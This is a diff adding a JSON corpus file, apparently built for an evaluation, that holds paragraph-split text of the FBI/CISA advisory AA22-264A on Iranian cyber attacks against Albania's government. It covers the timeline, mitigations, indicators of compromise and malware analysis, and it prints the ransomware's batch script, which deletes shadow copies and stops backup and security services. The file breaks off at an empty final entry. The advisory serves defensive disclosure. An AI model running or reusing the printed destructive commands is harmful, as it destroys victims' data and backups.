@@ -1,0 +1,402 @@
+[
+ {
+  "id": "p1",
+  "text": "# Iranian State Actors Conduct Cyber Operations Against the Government of Albania"
+ },
+ {
+  "id": "p2",
+  "text": "> - Publisher: FBI Internet Crime Complaint Center (IC3), CSA listing — advisory id AA22-264A\n> - Date: 2022-09-21\n> - URL: https://www.ic3.gov/CSA/2022/220921.pdf\n> - PDF SHA-256: 35a18ba1e344f07b0fbb566c0858733a638f3c8b5d2b98f73fe2c68bf50f9f65 (`source.pdf`, 18 pages)\n> - License: U.S. Government work (public domain)\n> - Text: `pdftotext -layout` output; only page furniture removed by `reports/eval/build_corpus.py` (38 lines). No other edits."
+ },
+ {
+  "id": "p3",
+  "text": "Co-Authored by:                                                                          TLP:WHITE             Product ID: AA22-264A\n                                                                                                                 September 21, 2022"
+ },
+ {
+  "id": "p4",
+  "text": "Iranian State Actors Conduct Cyber Operations\n        Against the Government of Albania"
+ },
+ {
+  "id": "p5",
+  "text": "SUMMARY\n        The Federal Bureau of Investigation (FBI) and the Cybersecurity and Infrastructure Security Agency\n        (CISA) are releasing this joint Cybersecurity Advisory to provide information on recent cyber\n        operations against the Government of Albania in July and September. This advisory provides a\n        timeline of activity observed, from initial access to execution of encryption and wiper attacks.\n        Additional information concerning files used by the actors during their exploitation of and cyber attack\n        against the victim organization is provided in Appendices A and B.\n        In July 2022, Iranian state cyber actors—identifying as “HomeLand Justice”—launched a destructive\n        cyber attack against the Government of Albania which rendered websites and services unavailable.\n        An FBI investigation indicates Iranian state cyber actors acquired initial access to the victim’s network\n        approximately 14 months before launching the destructive cyber attack, which included a\n        ransomware-style file encryptor and disk wiping malware. The actors maintained continuous network\n        access for approximately a year, periodically accessing and exfiltrating e-mail content.\n        Between May and June 2022, Iranian state cyber actors conducted lateral movements, network\n        reconnaissance, and credential harvesting from Albanian government networks. In July 2022, the\n        actors launched ransomware on the networks, leaving an anti-Mujahideen E-Khalq (MEK) message\n        on desktops. When network defenders identified and began to respond to the ransomware activity,\n        the cyber actors deployed a version of ZeroCleare destructive malware.\n        In June 2022, HomeLand Justice created a website and multiple social media profiles posting anti-\n        MEK messages. On July 18, 2022, HomeLand Justice claimed credit for the cyber attack on Albanian\n        government infrastructure. On July 23, 2022, Homeland Justice posted videos of the cyber attack on\n        their website. From late July to mid-August 2022, social media accounts associated with HomeLand"
+ },
+ {
+  "id": "p6",
+  "text": "All organizations should report incidents and anomalous activity to CISA’s 24/7 Operations Center at\n        report@cisa.gov or (888) 282-0870 and/or to the FBI via your local FBI field. State, local, tribal, and territorial\n        (SLTT) organizations should report incidents to MS-ISAC (866-787-4722 or SOC@cisecurity.org). When\n        available, please include the following information regarding the incident: date, time, and location of the incident;\n        type of activity; number of people affected; type of equipment used for the activity; the name of the submitting\n        company or organization; and a designated point of contact.\n        This document is marked TLP:WHITE. Disclosure is not limited. Sources may use TLP:WHITE when information\n        carries minimal or no foreseeable risk of misuse, in accordance with applicable rules and procedures for public\n        release. Subject to standard copyright rules, TLP:WHITE information may be distributed without restriction.\n        For more information on the Traffic Light Protocol, see http://www.us-cert.gov/tlp/."
+ },
+ {
+  "id": "p7",
+  "text": "TLP:WHITE                                                                                                     FBI | CISA"
+ },
+ {
+  "id": "p8",
+  "text": "Justice demonstrated a repeated pattern of advertising Albanian Government information for release,\n       posting a poll asking respondents to select the government information to be released by HomeLand\n       Justice, and then releasing that information—either in a .zip file or a video of a screen recording with\n       the documents shown.\n       In September 2022, Iranian cyber actors launched another wave of cyber attacks against the\n       Government of Albania, using similar TTPs and malware as the cyber attacks in July. These followed\n       closely after actions by Albania to publicly attribute the July cyber attacks and to severe diplomatic\n       ties with Iran."
+ },
+ {
+  "id": "p9",
+  "text": "TECHNICAL DETAILS\n       Initial access\n       Timeframe: Approximately 14 months before encryption and wiper attacks.\n       Details: Initial access was obtained via exploitation of an Internet-facing Microsoft SharePoint,\n       exploiting CVE-2019-0604."
+ },
+ {
+  "id": "p10",
+  "text": "Persistence and Lateral movement\n       Timeframe: Approximately several days to two months after initial compromise.\n       Details: Details: After obtaining access to the victim environment, the actors used several .aspx\n       webshells, pickers.aspx, error4.aspx, ClientBin.aspx, to maintain persistence. During\n       this timeframe, the actors also used RDP (primarily), SMB, and FTP for lateral movement throughout\n       the victim environment."
+ },
+ {
+  "id": "p11",
+  "text": "Exchange Server compromise\n       Timeframe: Approximately 1-6 months after initial compromise.\n       Details: The actors used a compromised Microsoft Exchange account to run searches (via CmdLets\n       New-MailboxSearch and Get-Recipient) on various mailboxes, including for administrator accounts. In\n       this timeframe, the actors used the compromised account to create a new Exchange account and add\n       it to the Organization Management role group."
+ },
+ {
+  "id": "p12",
+  "text": "Likely Email exfiltration\n       Timeframe: Approximately 8 months after initial compromise.\n       Details: The actors made thousands of HTTP POST requests to Exchange servers of the victim\n       organization. The FBI observed the client transferring roughly 70-160 MB of data, and the server\n       transferring roughly 3-20 GB of data."
+ },
+ {
+  "id": "p13",
+  "text": "TLP:WHITE                                                                                                    FBI | CISA"
+ },
+ {
+  "id": "p14",
+  "text": "VPN activity\n       Timeframe: Approximately 12-14 months after initial compromise.\n       Details: Approximately twelve months after initial access and two months before launching the\n       destructive cyber attack, the actors made connections to IP addresses belonging to the victim\n       organization’s Virtual Private Network (VPN) appliance. The actors’ activity primarily involved two\n       compromised accounts. The actors executed the “Advanced Port Scanner”\n       (advanced_port_scanner.exe). The FBI also found evidence of Mimikatz usage and LSASS dumping."
+ },
+ {
+  "id": "p15",
+  "text": "File Cryptor (ransomware-style file encryptor)\n       Timeframe: Approximately 14 months after initial compromise.\n       Details: For the encryption component of the cyber attack, the actor logged in to a victim organization\n       print server via RDP and kicked off a process (Mellona.exe) which would propagate the GoXml.exe\n       encryptor to a list of internal machines, along with a persistence script called win.bat. As deployed,\n       GoXML.exe encrypted all files (except those having extensions .exe, .dll, .sys, .lnk, or .lck) on the\n       target system, leaving behind a ransom note titled How_To_Unlock_MyFiles.txt in each folder\n       impacted."
+ },
+ {
+  "id": "p16",
+  "text": "Wiper attack\n       Timeframe: Approximately 14 months after initial compromise.\n       Details: In the same timeframe as the encryption attack, the actors began actions that resulted in raw\n       disk drives being wiped with the Disk Wiper tool (cl.exe) described in Appendix A. Over the next\n       approximately eight hours, numerous RDP connections were logged from an identified victim server\n       to other hosts on the victim’s network. Command line execution of cl.exe was observed in cached\n       bitmap files from these RDP sessions on the victim server."
+ },
+ {
+  "id": "p17",
+  "text": "MITIGATIONS\n               Ensure anti-virus and anti-malware software is enabled and signature definitions are updated\n                regularly and in a timely manner. Well-maintained anti-virus software may prevent use of\n                commonly deployed cyber attacker tools that are delivered via spear-phishing.\n               Adopt threat reputation services at the network device, operating system, application, and\n                email service levels. Reputation services can be used to detect or prevent low-reputation\n                email addresses, files, URLs, and IP addresses used in spear-phishing attacks.\n               If your organization is employing certain types of software and appliances vulnerable to known\n                Common Vulnerabilities and Exposures (CVEs), ensure those vulnerabilities are patched.\n                Prioritize patching known exploited vulnerabilities."
+ },
+ {
+  "id": "p18",
+  "text": "TLP:WHITE                                                                                                        FBI | CISA"
+ },
+ {
+  "id": "p19",
+  "text": "   Monitor for unusually large amounts of data (i.e. several GB) being transferred from a\n                  Microsoft Exchange server.\n                 Check the host-based indications, including webshells, for positive hits within your\n                  environment.\n       Additionally, FBI and CISA recommend organizations apply the following best practices to reduce risk\n       of compromise:\n                 Maintain and test an incident response plan.\n                 Ensure your organization has a vulnerability management program in place and that it\n                  prioritizes patch management and vulnerability scanning of known exploited vulnerabilities.\n                  Note: CISA’s Cyber Hygiene Services (CyHy) are free to all state, local, tribal, and territorial\n                  (SLTT) organizations, as well as public and private sector critical infrastructure organizations:\n                  cisa.gov/cyber-hygiene-services.\n                 Properly configure and secure internet-facing network devices.\n                      o Do not expose management interfaces to the internet.\n                      o Disable unused or unnecessary network ports and protocols.\n                      o Disable/remove unused network services and devices.\n                 Adopt zero-trust principles and architecture, including:\n                      o Micro-segmenting networks and functions to limit or block lateral movements.\n                      o Enforcing phishing-resistant multifactor authentication (MFA) for all users and VPN\n                           connections.\n                      o Restricting access to trusted devices and users on the networks.\n       For more information on Iranian government-sponsored malicious cyber activity, see CISA's webpage\n       – Iran Cyber Threat Overview and Advisories"
+ },
+ {
+  "id": "p20",
+  "text": "APPENDIX A1"
+ },
+ {
+  "id": "p21",
+  "text": "Host-based IOCs"
+ },
+ {
+  "id": "p22",
+  "text": "File                                          MD5 Hash                                  Notes\n           Error4.aspx                                   81e123351eb80e605ad73268a5653ff3 Webshell\n           cl.exe                                        7b71764236f244ae971742ee1bc6b098 Wiper\n           GoXML.exe                                     bbe983dba3bf319621b447618548b740 Encryptor\n           Goxml.jpg                                     0738242a521bdfe1f3ecc173f1726aa1"
+ },
+ {
+  "id": "p23",
+  "text": "Additional details concerning some of these files are provided in Appendix B."
+ },
+ {
+  "id": "p24",
+  "text": "TLP:WHITE                                                                                             FBI | CISA"
+ },
+ {
+  "id": "p25",
+  "text": "File                                          MD5 Hash                            Notes\n                                                                                          Webshell (reverse-\n        ClientBin.aspx                                a9fa6cfdba41c57d8094545e9b56db36\n                                                                                          proxy connections)\n        Pickers.aspx                                  8f766dea3afd410ebcd5df5994a3c571 Webshell\n        evaluatesiteupgrade.cs.aspx Unknown                                               Webshell\n                                                                                          Propagation for\n        mellona.exe                                   78562ba0069d4235f28efd01e3f32a82\n                                                                                          Encryptor\n                                                                                       Launches\n        win.bat                                                                        GoXml.exe on\n                                                      1635e1acd72809479e21b0ac5497a79b startup\n                                                                                       Changes desktop\n        win.bat                                                                        background to\n                                                      18e01dee14167c1cf8a58b6a648ee049 encryption image\n                                                                                       Saves SAM and\n                                                                                       SYSTEM hives to\n        bb.bat\n                                                                                       C:\\Temp, makes\n                                                      59a85e8ec23ef5b5c215cd5c8e5bc2ab cab archive\n                                                                                       Disables Windows\n        disable_defender.exe\n                                                      60afb1e62ac61424a542b8c7b4d2cf01 Defender\n                                                                                       Raw disk driver\n        rwdsk.sys                                                                      utilized by wiper\n                                                      8f6e7653807ebb57ecc549cef991d505 malware\n        App_Web_bckwssht.dll                          e9b6ecbf0783fa9d6981bba76d949c94"
+ },
+ {
+  "id": "p26",
+  "text": "Network-based IOCs\n       FBI review of Commercial VPN service IP addresses revealed the following resolutions (per Akamai\n       data):"
+ },
+ {
+  "id": "p27",
+  "text": "Country                        Company\n        AL                             KEMINET LTD.\n        DE                             NOOP-84-247-59-0-25\n        DE                             GSL NETWORKS\n        GB                             LON-CLIENTS"
+ },
+ {
+  "id": "p28",
+  "text": "TLP:WHITE                                                           FBI | CISA"
+ },
+ {
+  "id": "p29",
+  "text": "GB                             GB-DATACENTER\n        NL                             NL-LAYERSWITCH-20190220\n        NL                             PANQ-45-86-200-0\n        US                             PRIVATE CUSTOMER\n        US                             BANDITO NETWORKS\n        US                             EXTERNAL\n        US                             RU-SELENA-20080725\n        US                             TRANS OCEAN NETWORK"
+ },
+ {
+  "id": "p30",
+  "text": "TLP:WHITE                                                                                                   FBI | CISA"
+ },
+ {
+  "id": "p31",
+  "text": "APPENDIX B"
+ },
+ {
+  "id": "p32",
+  "text": "Ransomware Cryptor"
+ },
+ {
+  "id": "p33",
+  "text": "GoXML.exe is a ransomware style file encryptor. It is a Windows executable, digitally signed with a\n       certificate issued to the Kuwait Telecommunications Company KSC, a subsidiary of Saudi\n       Telecommunications Company (STC)."
+ },
+ {
+  "id": "p34",
+  "text": "If executed with five or more arguments (the arguments can be anything, as long as there are five or\n       more), the program silently engages its file encryption functionality. Otherwise, a file-open dialog\n       Window is presented, and any opened documents receive an error prompt labeled, Xml Form\n       Builder."
+ },
+ {
+  "id": "p35",
+  "text": "All internal strings are encrypted with a hard coded RC4 key. Before internal data is decrypted, the\n       string decryption routine has a built-in self-test that decrypts a DWORD value and tests to see if the\n       plaintext is the string yes. If so, it will continue to decode its internal strings."
+ },
+ {
+  "id": "p36",
+  "text": "The ransomware will attempt to launch the following batch script; however, this will fail due to a\n       syntax error."
+ },
+ {
+  "id": "p37",
+  "text": "@for /F \"skip=1\" %C in ('wmic LogicalDisk get DeviceID') do (@wmic\n        /namespace:\\\\root\\default Path SystemRestore Call disable \"%C\\\" & @rd /s /q\n        %C\\$Recycle.bin)\n        @vssadmin.exe delete shadows /all /quiet\n        @set SrvLst=vss sql svc$ memtas mepos sophos veeam backup GxVss GxBlr GxFWD\n        GxCVD GxCIMgr DefWatch ccEvtMgr ccSetMgr SavRoam RTVscan QBFCService\n        QBIDPService ntuit.QuickBooks.FCS QBCFMonitorService YooBackup YooIT\n        zhudongfangyu sophos stc_raw_agent VSNAPVSS VeeamTransportSvc\n        VeeamDeploymentService VeeamNFSSvc veeam PDVFSService BackupExecVSSProvider\n        BackupExecAgentAccelerator BackupExecAgentBrowser BackupExecDiveciMediaService\n        BackupExecJobEngine BackupExecManagementService BackupExecRPCService AcrSch2Svc\n        AcronisAgent CASAD2DWebSvc CAARCUpdateSvc\n        @for %C in (%SrvLst%) do @net stop %C\n        @set SrvLst=\n        @set PrcLst=mysql sql oracle ocssd dbsnmp synctime agntsvc isqlplussvc xfssvccon\n        mydesktopservice ocautoupds encsvc tbirdconfig mydesktopqos ocomm dbeng50\n        sqbcoreservice excel infopath msaccess mspub onenote outlook powerpnt steam\n        thebat thunderbird visio winword wordpad notepad\n        @for %C in (%PrcLst%) do @taskkill /f /im \"%C.exe\"\n        @set PrcLst=\n        @exit"
+ },
+ {
+  "id": "p38",
+  "text": "The syntax error consists of a missing backslash that separates system32 and cmd.exe, so the\n       process is launched as system32cmd.exe which is an invalid command."
+ },
+ {
+  "id": "p39",
+  "text": "TLP:WHITE                                                                                                  FBI | CISA"
+ },
+ {
+  "id": "p40",
+  "text": "Script Launch Bug\n       The ransomware’s file encryption routine will generate a random string, take the MD5 hash and use\n       that to generate an RC4 128 key which is used to encrypt files. This key is encrypted with a hard\n       coded Public RSA key and converted to Base64 utilizing a custom alphabet. This is appended to the\n       end of the ransom note."
+ },
+ {
+  "id": "p41",
+  "text": "The cryptor places a file called How_To_Unlock_MyFiles.txt in directories with encrypted files."
+ },
+ {
+  "id": "p42",
+  "text": "Each encrypted file is given the .lck extension and the contents of each file are only encrypted up\n       to 0x100000 or 1,048,576 bytes which is a hard coded limit."
+ },
+ {
+  "id": "p43",
+  "text": "Separately, the actor ran a batch script (win.bat below) to set a specific desktop background."
+ },
+ {
+  "id": "p44",
+  "text": "File Details\n        GoXml.exe\n        File Size:       43.48 KB (44520 bytes)\n        SHA256:          f116acc6508843f59e59fb5a8d643370dce82f492a217764521f46a856cc4cb5\n        SHA1:            5d117d8ef075f3f8ed1d4edcc0771a2a0886a376\n        MD5:             bbe983dba3bf319621b447618548b740\n        SSDeep:          768:+OFu8Q3w6QzfR5Jni6SQD7qSFDs6P93/q0XIc/UB5EPABWX\n                         :RFu8QAFzffJui79f13/AnB5EPAkX (Ver 1.1)\n        File Type:       PE32 executable (GUI) Intel 80386 (stripped to external PDB),\n                         for MS Windows\n        PE Header        2016-04-30 17:08:19\n        Timestamp:\n        ImpHash:   5b2ce9270beea5915ec9adbcd0dbb070\n        Cert #0 Subject C=KW, L=Salmiya, O=Kuwait Telecommunications Company\n        KSC, OU=Kuwait Telecommunications Company, CN=Kuwait\n        Telecommunications Company KSC\n        Cert #0 Issuer C=US, O=DigiCert Inc, OU=www.digicert.com,\n        CN=DigiCert SHA2 Assured ID Code Signing CA\n        Cert #0 SHA1      55d90ec44b97b64b6dd4e3aee4d1585d6b14b26f"
+ },
+ {
+  "id": "p45",
+  "text": "win.bat (#1, run malware)\n        File Size:    67 bytes\n        SHA256:       bad65769c0b416bb16a82b5be11f1d4788239f8b2ba77ae57948b53a69e230a6\n        SHA1:         14b8c155e01f25e749a9726958606b242c8624b9\n        MD5:          1635e1acd72809479e21b0ac5497a79b"
+ },
+ {
+  "id": "p46",
+  "text": "TLP:WHITE                                                                                      FBI | CISA"
+ },
+ {
+  "id": "p47",
+  "text": "SSDeep:          3:LjTFKCkRErG+fyM1KDCFUF82G:r0aH1+DF82G (Ver 1.1)\n        File Type:       ASCII text, with no line terminators\n        Contents:        start /min C:\\ProgramData\\Microsoft\\Windows\\GoXml.exe 1 2 3 4 5 6 7"
+ },
+ {
+  "id": "p48",
+  "text": "win.bat (#2, install desktop image)\n        Filename:      ec4cd040fd14bff86f6f6e7ba357e5bcf150c455532800edf97782836e97f6d2\n        File Size:     765 bytes\n        SHA256:        ec4cd040fd14bff86f6f6e7ba357e5bcf150c455532800edf97782836e97f6d2\n        SHA1:          fce0db6e66d227d3b82d4564446ede0c0fd7598c\n        MD5:           18e01dee14167c1cf8a58b6a648ee049\n        SSDeep:        12:wbYVJ69/TsdLd6sdLd3mTDwfV+EVTCuwfV+EVTCuwfV+EVTCuwfV+EVTCuwfV\n                          +Et:wq69/kZxZ3mTDY9HY9HY9HY9HY9j (Ver 1.1)\n        File Type:        DOS batch file text, ASCII text, with CRLF line terminators\n        Contents:\n        @echo off\n        setlocal enabledelayedexpansion\n        set \"Wtime=!time:~0,2!\"\n        if \"!Wtime!\" leq \"20\" reg add \"HKEY_CURRENT_USER\\Control Panel\\Desktop\" /v\n        Wallpaper /t REG_SZ /d \"c:\\programdata\\GoXml.jpg\" /f & goto done\n        if \"!Wtime!\" geq \"20\" reg add \"HKEY_CURRENT_USER\\Control Panel\\Desktop\" /v\n        Wallpaper /t REG_SZ /d \"c:\\programdata\\GoXml.jpg\" /f & goto done\n        :done\n        timeout /t 5 >nul\n        start \"\" /b RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters ,1 ,True\n        start \"\" /b RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters ,1 ,True\n        start \"\" /b RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters ,1 ,True\n        start \"\" /b RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters ,1 ,True\n        start \"\" /b RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters ,1 ,True\n        endlocal"
+ },
+ {
+  "id": "p49",
+  "text": "goxml.jpg\n        File Size: 1.2 MB (1259040 bytes)\n        SHA256: 63dd02c371e84323c4fd9a161a75e0f525423219e8a6ec1b95dd9eda182af2c9\n        SHA1:      683eaec2b3bb5436f00b2172e287dc95e2ff2266\n        MD5:       0738242a521bdfe1f3ecc173f1726aa1\n        SSDeep: 12288:ME0p1RE70zxntT/ylTyaaSMn2fS+0M6puxKfJbDKrCxMe5fPSC2tmx\n                      VjpJT/n37p:MHyUt7yQaaPXS6pjar+MwrjpJ7VIbZg (Ver 1.1)\n        File          JPEG image data, Exif standard: [TIFF image data, big-endian,\n        Type:         direntries=13, height=1752, bps=0, PhotometricIntepretation=CMYK,\n                      orientation=upper-left, width=2484TIFF image data, big-endian,\n                      direntries=13, height=1752, bps=0, PhotometricIntepretation=CMYK,\n                      orientation=upper-left, width=2484], progressive, precision 8, 2484x1752,\n                      components 4\n        Software:     Adobe Photoshop 22.4 (Windows)\n        Modify        2022-07-13 20:45:20\n        Date:\n        Create    2020-06-11 02:13:33\n        Date:"
+ },
+ {
+  "id": "p50",
+  "text": "TLP:WHITE                                                                                                    FBI | CISA"
+ },
+ {
+  "id": "p51",
+  "text": "Metadata      2022-07-13 20:45:20\n        Date:\n        Profile       2000-07-26 05:41:53\n        Date\n        Time:\n        Image         2484x1752\n        Size:\n        File Size:    1.2 MB (1259040 bytes)\n        SHA256:       63dd02c371e84323c4fd9a161a75e0f525423219e8a6ec1b95dd9eda182af2c9"
+ },
+ {
+  "id": "p52",
+  "text": "Disk Wiper\n       The files cl.exe and rwdsk.sys are part of a disk wiper utility that provides raw access to the hard\n       drive for the purposes of wiping data. From the command line the cl.exe file accepts the arguments:\n          •    in\n          •    un\n          •    wp <optional argument>"
+ },
+ {
+  "id": "p53",
+  "text": "If executed with the in command, the utility will output in start! and installs a hard coded file\n       named rwdsk.sys as a service named RawDisk3. The .SYS file is not extracted from the installer\n       however, but rather the installer looks for the file in the same directory that the cl.exe is executed in."
+ },
+ {
+  "id": "p54",
+  "text": "It will also load the driver after installation."
+ },
+ {
+  "id": "p55",
+  "text": "TLP:WHITE                                                                                                    FBI | CISA"
+ },
+ {
+  "id": "p56",
+  "text": "The un command uninstalls the service, outputting the message “un start!” to the terminal.\n       The wp command will access the loaded driver for raw disk access."
+ },
+ {
+  "id": "p57",
+  "text": "Raw Disk Access\n       The long hexadecimal string is hard coded in the cl.exe binary.\n                 RawDisk3File = (void *)toOpenRawDisk3File(\n                                          arg2_WideCharStr,\n                                          0xC0000000,"
+ },
+ {
+  "id": "p58",
+  "text": "L\"B4B615C28CCD059CF8ED1ABF1C71FE03C0354522990AF63ADF3C911E2287A4B906D47D\");\n              ptrRawDiskFile = RawDisk3File;\n              if ( RawDisk3File )\n              {\n                sizeDisk = toGetDiskSize(RawDisk3File);\n                terminal_out(\"Total Bytez : %lld\\n\", sizeDisk << 9);"
+ },
+ {
+  "id": "p59",
+  "text": "The wp command also takes an additional argument as a device path to place after \\RawDisk3\\ in\n       the output string. It is uncertain what creates this path to a device as the driver tested did not.\n       The output is “wp starts!” followed by the total bytes of the drive and the time the wipe operation\n       takes.\n       If the registry key value HKLM\\SOFTWARE\\EldoS\\EventLog is set to “Enabled”, the install will\n       generate an event log if at any time the install produces an error. This log contains an error code"
+ },
+ {
+  "id": "p60",
+  "text": "TLP:WHITE                                                                                                      FBI | CISA"
+ },
+ {
+  "id": "p61",
+  "text": "DWORD followed by the string ..\\..\\DriverLibraries\\DrvSupLib\\install.c. If the system does not have the\n       SOFTWARE\\EldoS key, no event logs would be produced. This feature must be a related to the\n       legitimate EldoS utility."
+ },
+ {
+  "id": "p62",
+  "text": "rwdsk.sys is a “legitimate commercial driver from the EldoS Corporation that is used for interacting\n       with files, disks, and partitions. The driver allows for direct modification of data on a local computer’s\n       hard drive. In some cases, the tool can enact these raw disk modifications from user-mode\n       processes, circumventing Windows operating system security features.”2"
+ },
+ {
+  "id": "p63",
+  "text": "File Details"
+ },
+ {
+  "id": "p64",
+  "text": "cl.exe\n           File Size              142.5 KB (145920 bytes)\n           SHA256                 e1204ebbd8f15dbf5f2e41dddc5337e3182fc4daf75b05acc948b8b965480ca0\n           SHA1                   f22a7ec80fbfdc4d8ed796119c76bfac01e0a908\n           MD5                    7b71764236f244ae971742ee1bc6b098\n           SSDeep                 3072:vv2ADi7yOcE/YMBSZ0fZX4kpK1OhJrDwM:vv2jeQ/flfZbKM (Ver 1.1)\n           Filetype               PE32+ executable (console) x86-64, for MS Windows\n           PE Header              2022-07-15 13:26:28\n           Timestamp\n           ImpHash                58d51c1152817ca3dec77f2eee52cbef"
+ },
+ {
+  "id": "p65",
+  "text": "https://attack.mitre.org/software/S0364/"
+ },
+ {
+  "id": "p66",
+  "text": "TLP:WHITE                                                                                    FBI | CISA"
+ },
+ {
+  "id": "p67",
+  "text": "rwdsk.sys\n        File Size        38.84 KB (39776 bytes)\n        SHA256           3c9dc8ada56adf9cebfc501a2d3946680dcb0534a137e2e27a7fcb5994cd9de6\n        SHA1             5e061701b14faf9adec9dd0b2423ff3cfc18764b\n        MD5              8f6e7653807ebb57ecc549cef991d505\n        SSDeep           768:E31ySCpoCbXnfDbEaJSooKIDyE9aBazWlEAusxsia:0gyCb3MFKIHO4Ausxta\n                         (Ver 1.1)\n        Filetype         PE32+ executable (native) x86-64, for MS Windows\n        PEtype           Driver\n        PE Header        2016-03-18 14:44:54\n        Timestamp\n        ImpHash          e233f2cdc91faafe1467d9e52f166213\n        Cert #0          CN=VeriSign Time Stamping Services CA, O=VeriSign, Inc., C=US\n        Subject\n        Cert #0          CN=VeriSign Time Stamping Services CA, O=VeriSign, Inc., C=US\n        Issuer\n        Cert #0          382c18388fb326221dfd7a77ee874f9ba60e04bf\n        SHA1\n        Cert #1          C=US, ST=California, L=SANTA CLARA, O=NVIDIA Corporation, CN=NVIDIA\n        Subject          Corporation\n        Cert #1          C=US, O=VeriSign, Inc., OU=VeriSign Trust Network, OU=Terms of use at\n        Issuer           https://www.verisign.com/rpa (c)10, CN=VeriSign Class 3 Code Signing\n                         2010 CA\n        Cert #1          30632ea310114105969d0bda28fdce267104754f\n        SHA1\n        Cert #2          C=US, O=VeriSign, Inc., OU=VeriSign Trust Network, OU=(c) 2006\n        Subject          VeriSign, Inc. - For authorized use only, CN=VeriSign Class 3 Public\n                         Primary Certification Authority - G5\n        Cert #2          C=US, ST=Washington, L=Redmond, O=Microsoft Corporation, CN=Microsoft\n        Issuer           Code Verification Root\n        Cert #2          57534ccc33914c41f70e2cbb2103a1db18817d8b\n        SHA1\n        Cert #3          C=US, O=VeriSign, Inc., OU=VeriSign Trust Network, OU=Terms of use at\n        Subject          https://www.verisign.com/rpa (c)10, CN=VeriSign Class 3 Code Signing\n                         2010 CA\n        Cert #3          C=US, O=VeriSign, Inc., OU=VeriSign Trust Network, OU=(c) 2006\n        Issuer           VeriSign, Inc. - For authorized use only, CN=VeriSign Class 3 Public\n                         Primary Certification Authority - G5\n        Cert #3          495847a93187cfb8c71f840cb7b41497ad95c64f\n        SHA1"
+ },
+ {
+  "id": "p68",
+  "text": "Additional files"
+ },
+ {
+  "id": "p69",
+  "text": "Web Deployed Reverse Proxy"
+ },
+ {
+  "id": "p70",
+  "text": "TLP:WHITE                                                                                                          FBI | CISA"
+ },
+ {
+  "id": "p71",
+  "text": "Description\n       ClientBin.aspx is an ASP file that contains a Base64 encoded .Net executable\n       (App_Web_bckwssht.dll) that it decodes and loads via Reflection. The .Net executable contains Class\n       and Method obfuscation and internal strings are encoded with a single byte XOR obfuscation.\n       public static string hair_school_bracket()\n              {\n                return Umbrella_admit_arctic.rebel_sadreporthospital(\"460F2830272A2F2266052928202F21661627252D27212368\n       \"); //Invalid Config Package.\n              }"
+ },
+ {
+  "id": "p72",
+  "text": "public static string Visual_math_already()\n            {\n           return Umbrella_admit_arctic.rebel_sadreporthospital(\"5304057E0116001607\"); //WV-RESET"
+ },
+ {
+  "id": "p73",
+  "text": "The method rebel_sadreporthospital takes the first byte of the encoded string and XOR’s each\n       subsequent byte to produce the de-obfuscated string.\n       When run in context of an IIS web server connecting to the ASPX file will generate a 200 <Encryption\n       DLL Info> 1.5 output."
+ },
+ {
+  "id": "p74",
+  "text": "Initial connection\n       The hex string represents the following ASCII text:\n       Base64, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null"
+ },
+ {
+  "id": "p75",
+  "text": "Sending a POST request with a Base64 encoded IP and port will open a second socket to the\n       supplied IP and port making this a Web proxy."
+ },
+ {
+  "id": "p76",
+  "text": "Second Socket Opened from POST Request"
+ },
+ {
+  "id": "p77",
+  "text": "TLP:WHITE                                                                                                   FBI | CISA"
+ },
+ {
+  "id": "p78",
+  "text": "Sending a request to WV-RESET with a value will produce an OK response and call a function to shut\n       down the proxy socket."
+ },
+ {
+  "id": "p79",
+  "text": "Terminate socket\n       The DLL extracts a secondary “EncryptionDLL” named Base64.dll which is loaded via\n       Assembly.Load. This exposes two functions, encrypt and decrypt. This DLL is used to decrypt the\n       Proxy IP and port along with data. In this instance the class name is misspelled Bsae64, which is also\n       reflected in the calling DLLs decoded strings. It is uncertain as to why an additional Base64.dll binary\n       is extracted when the same encoding could be hard coded in the original DLL. It is possible other\n       versions of this tool utilize differing “EncryptionDLL” binaries."
+ },
+ {
+  "id": "p80",
+  "text": "Misspelled Class Name"
+ },
+ {
+  "id": "p81",
+  "text": "Called Misspelled Name"
+ },
+ {
+  "id": "p82",
+  "text": "TLP:WHITE                                                                                              FBI | CISA"
+ },
+ {
+  "id": "p83",
+  "text": "File Details"
+ },
+ {
+  "id": "p84",
+  "text": "ClientBin.aspx\n        File Size                       55.24 KB (56561 bytes)\n        SHA256                          7ad64b64e0a4e510be42ba631868bbda8779139dc0daad9395ab048306\n                                        cc83c5\n        SHA1                            e03edd9114e7a0138d1309034cad6b461ab0035b\n        MD5                             a9fa6cfdba41c57d8094545e9b56db36\n        SSDeep                          768:x9TfK6nOgo5zE/cezUijAwZIFxK1mGjncrF8EAZ0iBDZBZdywb0DwH\n                                        N4N4wjMxr8:x9TfdOgAi2 (Ver 1.1)\n        Filetype                        HTML document text, ASCII text, with very long lines\n                                        (56458)"
+ },
+ {
+  "id": "p85",
+  "text": "App_Web_bckwssht.dll\n        File Size                       41.0 KB (41984 bytes)"
+ },
+ {
+  "id": "p86",
+  "text": "SHA256                          cad2bc224108142b5aa19d787c19df236b0d12c779273d05f9b0298a63\n                                        dc1fe5\n        SHA1                            49fd8de33aa0ea0c7432d62f1ddca832fab25325"
+ },
+ {
+  "id": "p87",
+  "text": "MD5                             e9b6ecbf0783fa9d6981bba76d949c94"
+ },
+ {
+  "id": "p88",
+  "text": "SSDeep                          384:coY4jnD7l9VAk1dtrGBlLGYEX1tah8dgNyamGOvMTfdYN5qZAsP:hl\n                                        XAkHRGBlUUh8cFmpv6feYLP (Ver 1.1)"
+ },
+ {
+  "id": "p89",
+  "text": "Filetype                        PE32 executable (DLL) (console) Intel 80386 Mono/.Net\n                                        assembly, for MS Windows\n        PEtype                          DLL"
+ },
+ {
+  "id": "p90",
+  "text": "PE Header Timestamp             2021-06-07 10:37:55"
+ },
+ {
+  "id": "p91",
+  "text": "ImpHash                         dae02f32a21e03ce65412f6e56942daa"
+ },
+ {
+  "id": "p92",
+  "text": "Disable Defender\n       Description\n       disable_defender.exe is a Microsoft Windows PE file that attempts to disable Windows Defender. The\n       application will elevate privileges to that of SYSTEM and then attempt to disable Defender’s core\n       functions. A command prompt with status and error messages is displayed as the application\n       executes. No network activity was detected during the evaluation.\n       Upon execution, a command prompt is launched and a message is displayed if the process is not\n       running as SYSTEM. The process is then restarted with the required permissions."
+ },
+ {
+  "id": "p93",
